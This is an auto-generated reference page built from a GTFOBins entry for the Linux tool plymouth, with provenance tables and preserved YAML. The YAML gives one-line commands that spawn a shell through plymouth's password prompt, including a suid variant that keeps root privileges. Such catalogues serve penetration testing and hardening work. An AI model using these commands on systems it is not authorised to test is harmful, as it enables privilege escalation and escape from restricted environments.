---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# plymouth

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `plymouth` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/plymouth` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [plymouth](../../tools/linux/plymouth.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | plymouth |
| name | plymouth |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/plymouth/ |

## Preserved Source Material

```yaml
_body: ''
_name: plymouth
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/plymouth
functions:
  shell:
  - code: plymouth ask-for-password --prompt=x --command=/bin/sh
    contexts:
      sudo: null
      suid:
        code: plymouth ask-for-password --prompt=x --command='/bin/sh -p'
        shell: false
      unprivileged: null
```
